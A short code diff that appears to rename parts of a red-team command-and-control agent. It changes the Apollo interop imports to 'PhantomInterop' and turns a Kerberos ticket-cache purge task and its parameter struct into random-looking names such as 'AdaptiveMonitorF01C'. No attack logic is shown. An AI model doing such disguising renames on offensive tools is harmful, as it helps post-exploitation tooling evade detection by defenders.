@@ -10,17 +10,17 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.Serialization;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 
 namespace Tasks;
 
-public class ticket_cache_purge : Tasking
+public class AdaptiveMonitorF01C : Tasking
 {
     
     [DataContract]
-    internal struct ticket_cache_purgeParameters
+    internal struct SpectreDispatcher720E
     {
         [DataMember(Name = "luid")]
         internal string? luid;
